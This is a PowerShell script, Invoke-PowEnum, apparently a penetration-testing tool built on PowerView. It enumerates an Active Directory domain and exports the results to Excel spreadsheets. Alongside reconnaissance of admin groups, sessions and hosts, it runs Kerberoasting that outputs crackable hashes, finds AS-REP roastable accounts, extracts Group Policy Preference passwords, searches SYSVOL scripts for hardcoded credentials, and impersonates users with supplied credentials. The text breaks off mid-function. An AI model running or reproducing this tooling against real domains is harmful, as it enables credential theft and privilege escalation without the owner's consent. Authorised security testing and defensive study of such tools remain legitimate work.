#requires -version 2

function Invoke-PowEnum {
<# 
	.SYNOPSIS 
		Enumerates and exports AD data using select PowerView (and similar) functions and combines the output into a single .xlsx.
		Author: Andrew Allen
		License: BSD 3-Clause
		
	.DESCRIPTION 
		Enumerates domain info using PowerSploit's PowerView
		then combines the exported .csv's into a tabbed .xlsx spreadsheet.
		PowEnum also leverages PowerSploit's Get-GPPPassword and Harmj0y's ASREPRoast
		
	.NOTES 
		Requires Excel to be installed on your system. 
		All dependencises for Powerview,ASREPRoast,GetGPPPassword have been build in. 
		
	.LINK 
		Credit & inspiration goes to:
		PowerSploit PowerView: https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
		PowerSploit Get-GPPPassword: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
		Export to CSV: https://gist.github.com/gregklee/b01348787af0b47d8b30
		PowerView Tips and Tricks: https://gist.github.com/HarmJ0y/3328d954607d71362e3c & https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
	
	.PARAMETER FQDN
		Specify the FQDN to use, defaults to the current domain.
		
	.PARAMETER Mode
		Basic: Basic Enumeration:
				UsersAndGroups Speadsheet
					Domain Admins, Enterprise Admins, Built-In Admins, DC Local Admins, misc privileged groups, All Domain Users, All Domain Groups, etc.
				HostsAndSessions Spreadsheet
					All [DC Aware] Net Sessions, Domain Controller, Domain Computer IPs, Domain Computers, Subnets, DNSRecords, WinRM Enabled Hosts, etc.
		Roasting: Kerberoast and ASREPRoast
		LargeEnv: Basic Enumeration without Get-DomainUser/Group/Computer
		Special: Enumerates Users With Specific Account Attributes:
			Disabled Account
			Enabled, Password Not Required
			Enabled, Password Doesn't Expire
			Enabled, Password Doesn't Expire & Not Required
			Enabled, Smartcard Required
			Enabled, Smartcard Required, Password Not Required
			Enabled, Smartcard Required, Password Doesn't Expire
		SYSVOL: Searches SYSVOL on DC
			Group Policy Passwords
			SYSVOL Script Files (potential hardcoded credentials)
		Forest:	
			Domain Trusts
			Foreign [Domain] Users
			Foreign [Domain] Group Members
			
	.EXAMPLE 
		
		PS C:\> Invoke-PowEnum
		
		Basic enumeration only using current domain and credential. .
	
	.EXAMPLE	
		
		PS C:\> Invoke-PowEnum -Domain test.com
		
		Perform basic enumeration for a specific domain (use FQDN).
		
	.EXAMPLE	
		
		PS C:\> Invoke-PowEnum -Mode Special
		
		Perform enumeration of user accounts with specific attributes.
	
	.EXAMPLE	
		
		PS C:\> Invoke-PowEnum -Credential test.domain.com\username -Mode Special
		
		Perform enumeration of user accounts with specific attributes using an alternate credential. Be sure to use FQDN.
#>

[CmdletBinding(DefaultParameterSetName="FQDN")]
Param(
	[Parameter(Position = 0)]
	[String]
	$FQDN,
	
	[Parameter(Position = 1)]
	[ValidateSet('Basic', 'Roasting', 'LargeEnv', 'Special', 'SYSVOL', 'Forest', 'All')]
	[String]
	$Mode = 'Basic',

	[Parameter(ParameterSetName = 'Credential')]
	[Management.Automation.PSCredential]
	[Management.Automation.Credential()]
	$Credential = [System.Management.Automation.PSCredential]::Empty,
	
	[Parameter(Position = 3)]
	[Switch]
	$NoExcel
)

	#Supprese Errors and Warnings
	#$ErrorActionPreference = 'Continue'
	#$WarningPreference = "SilentlyContinue"

	Write-Host "Current Date/Time: $(Get-Date)" -ForegroundColor Cyan
	
	if ($NoExcel -eq $False){
		try{$Excel = New-Object -ComObject excel.application}
		catch{Write-Warning "Is Excel Installed? Disabling Excel Output";$NoExcel = $True}
	}
	
	#Start Stopwatch
	$stopwatch = [system.diagnostics.stopwatch]::startnew()

	$Summary = $null

	#Uses PowerView to create a new "runas /netonly" type logon and impersonate the token.
	if ($Credential -ne [System.Management.Automation.PSCredential]::Empty){
		try{
			$NetworkCredential = $Credential.GetNetworkCredential()
			$Domain = $NetworkCredential.Domain
			$UserName = $NetworkCredential.UserName
			Write-Host "Impersonate user: $Domain\$Username | " -NoNewLine
			$Null = Invoke-UserImpersonation -Credential $Credential
			Write-Host "Success" -ForegroundColor Green 
		}catch{Write-Host "Error: $_" -ForegroundColor Red; Return}
	}
	
	
	Write-Host "Enumeration Domain: " -ForegroundColor Cyan -NoNewLine
	
	#Grab Local Domain
	if ($FQDN) {Write-Host "$FQDN" -ForegroundColor Cyan}
	elseif (!$FQDN) {
			$FQDN = (Get-Domain).Name
			Write-Host "$FQDN" -ForegroundColor Cyan
	}
	
	#If the domain is still empty
	if (!$FQDN -or $FQDN -eq "") {Write-Host "Unable to retrieve domain (make sure the FQDN, username, and password are correct), exiting..." -ForegroundColor Red; Return}
	
	#Quick check, if no DCs then something is wrong
	if ((Get-DomainController -Domain $FQDN) -eq $Null){Write-Host "Unable to retrieve domain controllers (make sure the FQDN, username, and password are correct), exiting..." -ForegroundColor Red; Return}

	#Identify Domain Controller with smallest response time
	Write-Host "Identifing DC w/ Shortest Response:" -ForegroundColor Cyan -NoNewLine
	$BestDomainController = Get-DomainController -Domain $FQDN | 
		Test-Connection -Count 1 | 
		Sort-Object -Property ResponseTime | 
		Select-Object -First 1
	$BestDomainControllerIP = $BestDomainController.IPV4Address.IPAddressToString
	$BestDomainControllerResponseTime = ${BestDomainController}.ResponseTime
	
	#If the domain is still empty
	if (!$BestDomainControllerIP -or $BestDomainControllerIP -eq "") {Write-Host "Unable to retrieve domain controller IP (make sure the FQDN, username, and password are correct), exiting..." -ForegroundColor Red; Return}
	Write-Host "" $BestDomainControllerIP "/" $([System.Net.Dns]::Resolve($BestDomainControllerIP).Hostname) "(${BestDomainControllerResponseTime}ms)"
	
	#Set up spreadsheet arrary and count
	$script:ExportSheetCount = 1
	$script:ExportSheetFileArray = @()
	
	#Set up DomainUser variable so multiple calls don't have to be made
	$script:DomainUserTable = $null

	#Set up current path
	$script:CurrentPath = (Get-Item -Path ".\" -Verbose).FullName
	
	Write-Host "Enumeration Mode: $Mode" -ForegroundColor Cyan

	if ($Mode -eq 'Basic') {
		$script:ExportSheetCount = 1
		$script:ExportSheetFileArray = @()
		PowEnum-DAs
		PowEnum-EAs
		PowEnum-BltAdmins
		PowEnum-SchemaAdmins
		PowEnum-AccountOperators
		PowEnum-BackupOperators
		PowEnum-PrintOperators
		PowEnum-ServerOperators
		PowEnum-GPCreatorsOwners
		PowEnum-CryptographicOperators
		PowEnum-AdminCount
		PowEnum-GroupManagers
		PowEnum-Users
		PowEnum-Groups
		PowEnum-CreateSummary
		PowEnum-ExcelFile -SpreadsheetName Basic-UsersAndGroups
		
		$script:ExportSheetCount = 1
		$script:ExportSheetFileArray = @()
		PowEnum-NetSess
		PowEnum-DCs
		PowEnum-IPs
		PowEnum-Subnets
		PowEnum-DNSRecords
		PowEnum-WinRM
		PowEnum-FileServers
		PowEnum-Computers
		PowEnum-ExcelFile -SpreadsheetName Basic-HostsAndSessions
	}
	elseif ($Mode -eq 'Roasting') {
		try {
			PowEnum-ASREPRoast
		}catch {Write-Host "Error: $_" -ForegroundColor Red}
		PowEnum-Kerberoast
		PowEnum-ExcelFile -SpreadsheetName Roasting
	}
	elseif ($Mode -eq 'LargeEnv') {
		$script:ExportSheetCount = 1
		$script:ExportSheetFileArray = @()
		PowEnum-DAs
		PowEnum-EAs
		PowEnum-BltAdmins
		PowEnum-SchemaAdmins
		PowEnum-AccountOperators
		PowEnum-BackupOperators
		PowEnum-PrintOperators
		PowEnum-ServerOperators
		PowEnum-GPCreatorsOwners
		PowEnum-CryptographicOperators
		PowEnum-GroupManagers
		PowEnum-CreateSummary
		PowEnum-ExcelFile -SpreadsheetName Large-Users
		
		$script:ExportSheetCount = 1
		$script:ExportSheetFileArray = @()
		PowEnum-NetSess
		PowEnum-DCs
		PowEnum-Subnets
		PowEnum-DNSRecords
		PowEnum-WinRM
		PowEnum-FileServers
		PowEnum-ExcelFile -SpreadsheetName Large-HostsAndSessions
	}
	elseif ($Mode -eq 'Special') {
		PowEnum-FillDomainUserTable
		PowEnum-Disabled
		PowEnum-PwNotReq
		PowEnum-PwNotExp
		PowEnum-PwNotExpireNotReq
		PowEnum-SmartCardReq
		PowEnum-SmartCardReqPwNotReq
		PowEnum-SmartCardReqPwNotExp
		PowEnum-ExcelFile -SpreadsheetName Special
	}
	elseif ($Mode -eq 'SYSVOL') {
		try {
			PowEnum-GPPPassword
		}catch {Write-Host "Error: $_" -ForegroundColor Red}
		PowEnum-SYSVOLFiles	
		PowEnum-LocalGroupChanges
		PowEnum-OUTree
		PowEnum-ExcelFile -SpreadsheetName SYSVOL
	}
	elseif ($Mode -eq 'Forest') {
		PowEnum-DomainTrusts
		PowEnum-ForeignUsers
		PowEnum-ForeignGroupMembers
		PowEnum-GPPPassword-Forest
		PowEnum-ExcelFile -SpreadsheetName SYSVOL
	}
	elseif ($Mode -eq 'All') {
		$script:ExportSheetCount = 1
		$script:ExportSheetFileArray = @()
			Write-Host "Enumeration (1 of 5): Basic" -ForegroundColor Cyan
			PowEnum-DAs
			PowEnum-EAs
			PowEnum-BltAdmins
			PowEnum-SchemaAdmins
			PowEnum-AccountOperators
			PowEnum-BackupOperators
			PowEnum-PrintOperators
			PowEnum-ServerOperators
			PowEnum-GPCreatorsOwners
			PowEnum-CryptographicOperators
			PowEnum-AdminCount
			PowEnum-GroupManagers
			PowEnum-Users
			PowEnum-Groups
			PowEnum-CreateSummary
			PowEnum-ExcelFile -SpreadsheetName All-UsersAndGroups
		
		$script:ExportSheetCount = 1
		$script:ExportSheetFileArray = @()
			PowEnum-NetSess
			PowEnum-DCs
			PowEnum-IPs
			PowEnum-Subnets
			PowEnum-DNSRecords
			PowEnum-WinRM
			PowEnum-FileServers
			PowEnum-Computers
			PowEnum-ExcelFile -SpreadsheetName All-HostsAndSessions
	
		$script:ExportSheetCount = 1
		$script:ExportSheetFileArray = @()
			Write-Host "Enumeration (2 of 5): Roasting" -ForegroundColor Cyan
			try {
				PowEnum-ASREPRoast
			}catch {Write-Host "Error: $_" -ForegroundColor Red}
			PowEnum-Kerberoast
			PowEnum-ExcelFile -SpreadsheetName All-Roasting
	
		$script:ExportSheetCount = 1
		$script:ExportSheetFileArray = @()
			Write-Host "Enumeration (3 of 5): Special" -ForegroundColor Cyan
			PowEnum-FillDomainUserTable
			PowEnum-Disabled
			PowEnum-PwNotReq
			PowEnum-PwNotExp
			PowEnum-PwNotExpireNotReq
			PowEnum-SmartCardReq
			PowEnum-SmartCardReqPwNotReq
			PowEnum-SmartCardReqPwNotExp
			PowEnum-ExcelFile -SpreadsheetName Special
		
		
		$script:ExportSheetCount = 1
		$script:ExportSheetFileArray = @()
			Write-Host "Enumeration (4 of 5): SYSVOL" -ForegroundColor Cyan
			try {
				PowEnum-GPPPassword
			}catch {Write-Host "Error: $_" -ForegroundColor Red}
			PowEnum-SYSVOLFiles	
			PowEnum-LocalGroupChanges
			PowEnum-OUTree
			PowEnum-ExcelFile -SpreadsheetName SYSVOL
			
		$script:ExportSheetCount = 1
		$script:ExportSheetFileArray = @()			
			Write-Host "Enumeration (5 of 5): Foreign" -ForegroundColor Cyan
			PowEnum-DomainTrusts
			PowEnum-ForeignUsers
			PowEnum-ForeignGroupMembers
			PowEnum-GPPPassword-Forest
			PowEnum-ExcelFile -SpreadsheetName SYSVOL
	}
	else {
		Write-Host "Incorrect Mode Selected"
		Return
	}

	#reverting Token
	if ($Credential -ne [System.Management.Automation.PSCredential]::Empty){
	try{
		$NetworkCredential = $Credential.GetNetworkCredential()
		$Domain = $NetworkCredential.Domain
		$UserName = $NetworkCredential.UserName
		Write-Host "Reverting Token from: $Domain\$Username | " -NoNewLine
		$Null = Invoke-RevertToSelf
		Write-Host "Success" -ForegroundColor Green 
	}catch{Write-Host "Error: $_" -ForegroundColor Red; Return}
}	

	$script:ExportSheetCount = $null
	$script:ExportSheetFileArray = $null
	$Summary = $null
	[System.GC]::Collect()
	[System.GC]::WaitForPendingFinalizers()

	$stopwatch.Stop()
	$elapsedtime = "{0:N0}" -f ($stopwatch.Elapsed.TotalSeconds)
	Write-Host $("Running Time: " + $elapsedtime + "s") -ForegroundColor Cyan
	Write-Host "Current Date/Time: $(Get-Date)" -ForegroundColor Cyan
	Write-Host "Exiting..." -ForegroundColor Yellow
}

function PowEnum-DCs {
	try {
		Write-Host "[ ]Domain Controllers | " -NoNewLine
		$temp = Get-DomainController -Domain $FQDN -Server $BestDomainControllerIP | Select-Object Name, IPAddress, Domain, Forest, OSVersion, SiteName
		PowEnum-ExportAndCount -TypeEnum DCs
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-DAs {
	try {
		Write-Host "[ ]Domain Admins (DA) | " -NoNewLine
		$temp = Get-DomainGroupMember -Identity "Domain Admins" -Recurse -Domain $FQDN -Server $BestDomainControllerIP | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
		if($temp -ne $null){$script:Summary += ($temp | Select-Object *,@{N="Source";E={"DAs"}})}
		PowEnum-ExportAndCount -TypeEnum DAs
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-EAs {
	try {
		Write-Host "[ ]Enterprise Admins (EA) | " -NoNewLine
		$temp = Get-DomainGroupMember -Identity "Enterprise Admins" -Recurse -Domain $FQDN -Server $BestDomainControllerIP | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
		if($temp -ne $null){$script:Summary += ($temp | Select-Object *,@{N="Source";E={"EAs"}})}
		PowEnum-ExportAndCount -TypeEnum EAs
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-SchemaAdmins {
	try {
		Write-Host "[ ]Schema Admins (SA) | " -NoNewLine
		$temp = Get-DomainGroupMember -Identity "Schema Admins" -Recurse -Domain $FQDN -Server $BestDomainControllerIP | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
		if($temp -ne $null){$script:Summary += ($temp | Select-Object *,@{N="Source";E={"SAs"}})}
		PowEnum-ExportAndCount -TypeEnum SAs
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-AccountOperators {
	try {
		Write-Host "[ ]Account Operators (AO) | " -NoNewLine
		$temp = Get-DomainGroupMember -Identity "Account Operators" -Recurse -Domain $FQDN -Server $BestDomainControllerIP | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
		if($temp -ne $null){$script:Summary += ($temp | Select-Object *,@{N="Source";E={"AOs"}})}
		PowEnum-ExportAndCount -TypeEnum AOs
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-BackupOperators {
	try {
		Write-Host "[ ]Backup Operators (BO) | " -NoNewLine
		$temp = Get-DomainGroupMember -Identity "Backup Operators" -Recurse -Domain $FQDN -Server $BestDomainControllerIP | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
		if($temp -ne $null){$script:Summary += ($temp | Select-Object *,@{N="Source";E={"BOs"}})}
		PowEnum-ExportAndCount -TypeEnum BOs
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-PrintOperators {
	try {
		Write-Host "[ ]Print Operators (PO) | " -NoNewLine
		$temp = Get-DomainGroupMember -Identity "Print Operators" -Recurse -Domain $FQDN -Server $BestDomainControllerIP | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
		if($temp -ne $null){$script:Summary += ($temp | Select-Object *,@{N="Source";E={"POs"}})}
		PowEnum-ExportAndCount -TypeEnum POs
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-ServerOperators {
	try {
		Write-Host "[ ]Server Operators (SO) | " -NoNewLine
		$temp = Get-DomainGroupMember -Identity "Server Operators" -Recurse -Domain $FQDN -Server $BestDomainControllerIP | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
		if($temp -ne $null){$script:Summary += ($temp | Select-Object *,@{N="Source";E={"SOs"}})}
		PowEnum-ExportAndCount -TypeEnum SOs
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-GPCreatorsOwners {
	try {
		Write-Host "[ ]Group Policy Creators Owners | " -NoNewLine
		$temp = Get-DomainGroupMember -Identity "Group Policy Creators Owners" -Recurse -Domain $FQDN -Server $BestDomainControllerIP | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
		if($temp -ne $null){$script:Summary += ($temp | Select-Object *,@{N="Source";E={"GPCreatorsOwners"}})}
		PowEnum-ExportAndCount -TypeEnum GPCreatorsOwners
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-CryptographicOperators {
	try {
		Write-Host "[ ]Cryptographic Operators (CO) | " -NoNewLine
		$temp = Get-DomainGroupMember -Identity "Cryptographic Operators" -Recurse -Domain $FQDN -Server $BestDomainControllerIP | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
		if($temp -ne $null){$script:Summary += ($temp | Select-Object *,@{N="Source";E={"COs"}})}
		PowEnum-ExportAndCount -TypeEnum COs
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-BltAdmins {
	try {
		Write-Host "[ ]Builtin Administrators (BA) | " -NoNewLine
		$temp = Get-DomainGroupMember -Identity "Administrators" -Recurse -Domain $FQDN -Server $BestDomainControllerIP | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
		if($temp -ne $null){$script:Summary += ($temp | Select-Object *,@{N="Source";E={"BAs"}})}
		PowEnum-ExportAndCount -TypeEnum BAs
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-AdminCount {
	try {
		Write-Host "[ ]All Users With AdminCount=1 | " -NoNewLine
		$temp = Get-DomainUser -AdminCount -Domain $FQDN -Server $BestDomainControllerIP | 
			Select-Object samaccountname, description, @{N="MemberOf";E={ 
				$ConvertedGroupNames = ForEach-Object {$_.MemberOf | Convert-ADName -OutputType NT4 -Domain $FQDN -Server $BestDomainControllerIP}; 
				$ConvertedGroupNames -join "; "}}, 
				pwdlastset, admincount, distinguishedname, userprincipalname, serviceprincipalname, useraccountcontrol, iscriticalsystemobject
		if($temp -ne $null){
			$script:Summary += (
				$temp | Select-Object @{N="MemberName";E={$_.samaccountname}},
					@{N="MemberDomain";E={"$FQDN"}},
					@{N="Source";E={"AdminCount"}}
			)
		}
		PowEnum-ExportAndCount -TypeEnum AdminCount
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-Users {
	try {
		Write-Host "[ ]All Domain Users (this could take a while) | " -NoNewLine
		$temp = Get-DomainUser -Domain $FQDN -Server $BestDomainControllerIP | 
			Select-Object samaccountname, description, @{N="MemberOf";E={ 
				$ConvertedGroupNames = ForEach-Object {$_.MemberOf | Convert-ADName -OutputType NT4 -Domain $FQDN -Server $BestDomainControllerIP}; 
				$ConvertedGroupNames -join "; "}}, 
				pwdlastset, admincount, distinguishedname, userprincipalname, serviceprincipalname, useraccountcontrol, iscriticalsystemobject
		PowEnum-ExportAndCount -TypeEnum AllUsers
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-Groups {
	try {
		Write-Host "[ ]All Domain Groups (this could take a while) | " -NoNewLine
		$temp = Get-DomainGroup -Domain $FQDN -Server $BestDomainControllerIP | Select-Object samaccountname, admincount, description, iscriticalsystemobject, 
			@{N="MemberOf";E={ 
			$ConvertedGroupNames = ForEach-Object {$_.MemberOf | Convert-ADName -OutputType NT4 -Domain $FQDN}; 
			$ConvertedGroupNames -join "; "}}
		PowEnum-ExportAndCount -TypeEnum AllGroups
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-Computers {
	try {
		Write-Host "[ ]All Domain Computers (this could take a while) | " -NoNewLine
		$temp = Get-DomainComputer -Domain $FQDN -Server $BestDomainControllerIP | Select-Object samaccountname, dnshostname, operatingsystem, operatingsystemversion, operatingsystemservicepack, lastlogon, badpwdcount, iscriticalsystemobject, distinguishedname, 
				@{N="MemberOf";E={ 
				$ConvertedGroupNames = ForEach-Object {$_.MemberOf | Convert-ADName -OutputType NT4 -Domain $FQDN -Server $BestDomainControllerIP}; 
				$ConvertedGroupNames -join "; "}}
		PowEnum-ExportAndCount -TypeEnum AllComputers
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-IPs {
	try {
		Write-Host "[ ]All Domain Computer IP Addresses  | " -NoNewLine
		$temp = Get-DomainComputer -Domain $FQDN -Server $BestDomainControllerIP | Resolve-IPAddress
		PowEnum-ExportAndCount -TypeEnum IPs
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-DCLocalAdmins {
	try {
		Write-Host "[ ]All Domain Controller Local Admins (DCLA) | " -NoNewLine
		
		$temp = $null
		
		Get-DomainController | ForEach-Object {
			$Domain_Controller_Hostname = $_
			
			#Get Local Admins On DC using WinNT method because the other method doesnt properly account for the local admin SID being the domain SID
			$DomainController_LocalAdmin = Get-NetLocalGroupMember -Method WinNT -ComputerName $Domain_Controller_Hostname
			
			#If the local admin is a group and domain then recursively get all members and add to table
			$DomainController_LocalAdmin_DomainGroupMembers = $DomainController_LocalAdmin | 
				Where-Object {$_.IsGroup -eq $TRUE -and $_.IsDomain -eq $TRUE} | 
					ForEach-Object {$_.AccountName.Substring($_.AccountName.IndexOf("\")+1)} | 
						Get-DomainGroupMember -Recurse -Domain $FQDN | 
							Select-Object @{N="ComputerName";E={"$Domain_Controller_Hostname"}}, 
								@{N="AccountName";E={-join ($_.MemberDomain, "\", $_.MemberName)}}, 
								@{N="SID";E={-join ($_.MemberSID)}}, 
								@{N="IsGroup";E={"$False"}}, 
								@{N="IsDomain";E={"$True"}},
								@{N="GroupName";E={"$($_.GroupName)"}}
			
			#Get all local admins with an empty groupname and change the $null value to a string (prevents excel export issues)
			$DomainController_LocalAdmin_DomainGroupMembers = $DomainController_LocalAdmin_DomainGroupMembers |
			  Select-Object ComputerName,AccountName,SID,IsGroup,IsDomain, @{
					Label = "GroupName"
					Expression = { if ($_.GroupName) { $_.GroupName } else { "No Data" } }
			 }
			
			$DomainController_LocalAdmin += $DomainController_LocalAdmin_DomainGroupMembers |
				Select-Object ComputerName, GroupName, AccountName, SID, isGroup, isDomain
			
			$script:Summary += ($DomainController_LocalAdmin | 
				Select-Object @{N="MemberName";E={$_.AccountName.Substring($_.AccountName.IndexOf("\")+1)}},
					@{N="MemberDomain";E={$_.AccountName.Substring(0,$_.AccountName.IndexOf("\"))}},
					@{N="Source";E={"DCLocalAdmins"}}
			)
		
			$temp += $DomainController_LocalAdmin
		}
		
		PowEnum-ExportAndCount -TypeEnum DCLAs
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-Subnets {
	try {
		Write-Host "[ ]Domain Subnets | " -NoNewLine
		$temp = Get-DomainSubnet -Domain $FQDN -Server $BestDomainControllerIP
		PowEnum-ExportAndCount -TypeEnum Subnets
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-DNSRecords {
	#try {
		Write-Host "[ ]DNS Zones & Records | " -NoNewLine
		$DnsZones = Get-DomainDNSZone -Domain $FQDN -Server $BestDomainControllerIP
		if ($DnsZones -ne $null) {
			$temp = $DnsZones | Get-DomainDNSRecord -ErrorAction SilentlyContinue
		}
		PowEnum-ExportAndCount -TypeEnum DNSRecords
	#}catch {Write-Host ""}
}

function PowEnum-NetSess {
	try {
		Write-Host "[ ]Net Sessions | " -NoNewLine
		$temp = Get-DomainController -Domain $FQDN -Server $BestDomainControllerIP | Get-NetSession | ?{$_.UserName -notlike "*$"}
		PowEnum-ExportAndCount -TypeEnum NetSess
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-WinRM {
	try {
		Write-Host "[ ]WinRm (Powershell Remoting) Enabled Hosts | " -NoNewLine
		$temp = Get-DomainComputer -Domain $FQDN -Server $BestDomainControllerIP -LDAPFilter "(|(operatingsystem=*7*)(operatingsystem=*2008*))" -SPN "wsman*" -Properties dnshostname,operatingsystem,distinguishedname
		PowEnum-ExportAndCount -TypeEnum WinRM
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-FillDomainUserTable {
	try{
		Write-Host "...Filling Domain User Table | " -NoNewLine
		$script:DomainUserTable = Get-DomainUser -Domain $FQDN -Server $BestDomainControllerIP | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname, useraccountcontrol
		
		$count = $script:DomainUserTable | measure-object | select-object -expandproperty Count
		if($script:DomainUserTable -eq $null){
			$count = 0
		}
		Write-Host "$count Identified" -ForegroundColor Green
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-Disabled {
	try{
		Write-Host "[ ]Disabled Account | " -NoNewLine
		$temp = $script:DomainUserTable | Where-Object {$_.useraccountcontrol -eq '514'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname
		PowEnum-ExportAndCount -TypeEnum Disabled
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-PwNotReq {
	try{
		Write-Host "[ ]Enabled, Password Not Required | " -NoNewLine
		$temp = $script:DomainUserTable | Where-Object {$_.useraccountcontrol -eq '544'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname
		PowEnum-ExportAndCount -TypeEnum PwNotReq
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-PwNotExp {
	try{
		Write-Host "[ ]Enabled, Password Doesn't Expire | " -NoNewLine
		$temp = $script:DomainUserTable | Where-Object {$_.useraccountcontrol -eq '66048'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname 
		PowEnum-ExportAndCount -TypeEnum PwNotExpire
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-PwNotExpireNotReq {
	try{
		Write-Host "[ ]Enabled, Password Doesn't Expire & Not Required | " -NoNewLine
		$temp = $script:DomainUserTable | Where-Object {$_.useraccountcontrol -eq '66080'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname 
		PowEnum-ExportAndCount -TypeEnum PwNotExpireNotReq
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-SmartCardReq {
	try{
		Write-Host "[ ]Enabled, Smartcard Required | " -NoNewLine
		$temp = $script:DomainUserTable | Where-Object {$_.useraccountcontrol -eq '262656'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname 
		PowEnum-ExportAndCount -TypeEnum SmartCardReq
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-SmartCardReqPwNotReq {
	try{
		Write-Host "[ ]Enabled, Smartcard Required, Password Not Required | " -NoNewLine
		$temp = $script:DomainUserTable | Where-Object {$_.useraccountcontrol -eq '262688'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname 
		PowEnum-ExportAndCount -TypeEnum SmartCardReqPwNotReq
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-SmartCardReqPwNotExp {
	try{
		Write-Host "[ ]Enabled, Smartcard Required, Password Doesn't Expire | " -NoNewLine
		$temp = $script:DomainUserTable | Where-Object {$_.useraccountcontrol -eq '328192'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname 
		PowEnum-ExportAndCount -TypeEnum SmartCardReqPwNotExp
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-SmartCardReqPwNotExpNotReq {
	try{
		Write-Host "[ ]Enabled, Smartcard Required, Password Doesn't Expire & Not Required | " -NoNewLine
		$temp = $script:DomainUserTable | Where-Object {$_.useraccountcontrol -eq '328224'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname 
		PowEnum-ExportAndCount -TypeEnum SmartCardReqPwNotExpNotReq
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-ASREPRoast {
	try{
		Write-Host "[ ]ASREProast (Potential) | " -NoNewLine
		$temp = Get-DomainUser -PreAuthNotRequired -Domain $FQDN -Server $BestDomainControllerIP 
		PowEnum-ExportAndCount -TypeEnum ASREPRoast
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-Kerberoast {
	try{
		Write-Host "[ ]Kerberoast (Hashcat Format) | " -NoNewLine
		$temp = Invoke-Kerberoast -Domain $FQDN -Server $BestDomainControllerIP -WarningAction silentlyContinue
		PowEnum-ExportAndCount -TypeEnum Kerberoast
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-GPPPassword {
	try{
		Write-Host "[ ]GPP Password(s) | " -NoNewLine
		$temp = Get-GPPPassword -Server $BestDomainControllerIP
		PowEnum-ExportAndCount -TypeEnum GPPPassword
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-GPPPassword-Forest {
	try{
		Write-Host "[ ]GPP Password(s) [Forest] | " -NoNewLine
		$temp = Get-GPPPassword -Server $FQDN -SearchForest
		PowEnum-ExportAndCount -TypeEnum GPPPassword-Forest
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-SYSVOLFiles {
	try{
		Write-Host "[ ]Potential logon scripts on \\$FQDN\SYSVOL | " -NoNewLine
		$temp = Find-InterestingFile -Path \\$FQDN\sysvol -Include @('*.vbs', '*.bat', '*.ps1', '.cmd') -Verbose
		PowEnum-ExportAndCount -TypeEnum SYSVOLFiles
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-GroupManagers {
	try{
		Write-Host "[ ]AD Group Managers | " -NoNewLine
		$temp = Get-DomainManagedSecurityGroup -Domain $FQDN -Server $BestDomainControllerIP
		PowEnum-ExportAndCount -TypeEnum GroupManagers
	}catch {Write-Host "Error: $_" -ForegroundColor Red}
}

function PowEnum-FileServers {
	try{
